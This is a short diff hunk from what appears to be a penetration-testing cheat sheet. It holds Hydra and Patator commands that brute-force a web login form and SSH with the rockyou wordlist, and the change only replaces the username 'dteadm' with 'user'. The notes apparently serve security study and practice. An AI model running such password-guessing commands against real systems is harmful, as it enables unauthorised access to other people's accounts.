@@ -404,7 +404,7 @@ Forensics RECOPILATION: https://start.me/p/JDRmPO/recursos-forenses
 
 * Hydra. Cheat Sheet: hydra -l admin -P /usr/share/wordlists/rockyou.txt IP http-post-form “__csrf_magic=sid%3Ae40fd9611063464c3ff346ffa53b7a28b3cd5971%2C1638348501&usernamefld=admin&passwordfld=^PASS^&login=Sign+In" || patator http_fuzz url=http://IP/ method=POST &usernamefld=admin&passwordfld=FILE0&login=Sign+In' 0=/usr/share/wordlists/rockyou.txt follow=1 accept_cookie=1 -x ignore:fgrep='Username or Password incorrect'
 
-*hydra -s 22 -l dteadm -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh
+*hydra -s 22 -l user -P /usr/share/wordlists/rockyou.txt IP -t 4 ssh
 
 * Dirbuster. https://mundo-hackers.weebly.com/dirbuster.html
 
